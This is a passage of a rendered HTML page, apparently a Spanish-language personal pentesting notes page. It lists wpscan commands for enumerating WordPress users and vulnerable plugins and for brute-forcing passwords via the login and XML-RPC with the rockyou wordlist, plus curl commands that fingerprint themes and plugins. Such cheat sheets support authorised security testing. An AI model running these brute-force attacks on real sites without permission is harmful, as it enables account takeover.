+<span class="line"><span style="color:#50FA7B">wpscan</span><span style="color:#BD93F9"> --url</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/wordpress</span><span style="color:#BD93F9"> --enumerate</span><span style="color:#F1FA8C"> u,vp</span><span style="color:#BD93F9"> --random-user-agent</span><span style="color:#BD93F9"> --force</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> wpscan.txt</span></span>
+<span class="line"><span style="color:#50FA7B">wpscan</span><span style="color:#BD93F9"> --url</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/wordpress/</span><span style="color:#BD93F9"> --passwords</span><span style="color:#F1FA8C"> /path/rockyou.txt</span><span style="color:#BD93F9"> --usernames</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">USE</span><span style="color:#F8F8F2">R</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> --random-user-agent</span><span style="color:#BD93F9"> --force</span></span>
+<span class="line"></span></code></pre>
+<h2 id="comandos-curl-para-info">Comandos CURL para info</h2>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">curl</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DOMINI</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> grep</span><span style="color:#F1FA8C"> WordPress</span></span>
+<span class="line"><span style="color:#50FA7B">curl</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DOMINI</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> grep</span><span style="color:#F1FA8C"> themes</span></span>
+<span class="line"><span style="color:#50FA7B">curl</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DOMINI</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> grep</span><span style="color:#F1FA8C"> plugins</span></span>
+<span class="line"><span style="color:#50FA7B">curl</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DOMINI</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/?p=</span><span style="color:#BD93F9">1</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> grep</span><span style="color:#F1FA8C"> plugins</span></span></code></pre>
+<h2 id="fuerza-bruta-xml-rpc">Fuerza bruta XML-RPC</h2>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#50FA7B">wpscan</span><span style="color:#BD93F9"> --password-attack</span><span style="color:#F1FA8C"> xmlrpc</span><span style="color:#BD93F9"> -t</span><span style="color:#BD93F9"> 20</span><span style="color:#BD93F9"> -U</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">USE</span><span style="color:#F8F8F2">R</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -P</span><span style="color:#F1FA8C"> /usr/share/wordlists/rockyou.txt</span><span style="color:#BD93F9"> --url</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DOMINI</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span></span>
+<span class="line"></span></code></pre>
+<hr> </div> <div class="mt-16 pt-8 border-t border-slate-800"> <a href="/projects" class="text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a la lista de proyectos
+</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
+© 2025 Angel Corral - Todos los derechos reservados.
+</div> </footer> </div> </body></html>
